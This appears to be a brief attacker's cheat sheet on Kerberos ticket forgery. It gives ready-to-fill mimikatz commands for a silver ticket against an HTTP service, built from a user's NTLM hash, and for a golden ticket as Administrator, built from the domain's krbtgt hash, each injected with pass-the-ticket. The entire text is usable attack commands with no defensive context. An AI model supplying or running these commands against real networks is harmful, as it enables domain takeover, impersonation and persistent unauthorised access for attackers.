## Ticket Forgery

### Silver Ticket Forgery

If attempting to forge a silver ticket to hit a website, from within `mimikatz.exe`:
```
kerberos::golden /sid:<current user SID> /domain:<FQDN> /ptt /target:target-site.our.domain /service:http /rc4:<NTLM hash of user whose privilege we want to assume> /user:chumpasaurusUser
```

### Golden Ticket Forgery

From `mimikatz.exe`:
```
kerberos::golden /user:Administrator /domain:<FQDN> /sid:<Domain SID> /krbtgt:<krbtgt NTLM hash> /target:<target DC> /ptt
```